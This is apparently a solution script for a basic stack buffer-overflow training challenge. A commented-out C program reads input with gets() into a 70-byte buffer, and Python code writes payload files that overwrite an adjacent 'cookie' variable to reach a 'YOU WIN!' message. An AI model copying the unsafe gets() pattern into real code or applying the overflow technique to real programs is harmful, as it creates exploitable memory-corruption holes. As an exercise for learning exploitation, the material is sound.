#int main(int argc, char*argv[]){
#    int cookie=0;
#    char buf[70];
#
#    gets(buf);
#
#    if (cookie == 0x01020304)
#        printf("YOU WIN!\n");
#
#return 0;
#}

with open('./02-challenge.win','wb') as win:
	buffer = '\x00' * 70
	cookie = '\x04\x03\x02\x01'
	win.write(buffer + cookie)

with open('./01-02-challenge.win','wb') as win:
	buffer = '\x00' * 70
	cookie1 = '\x04\x03\x02\x01'
	padding = '\x00' * 6
	cookie2 = '\x44\x43\x42\x41'
	win.write(buffer + cookie1 + padding + cookie2)

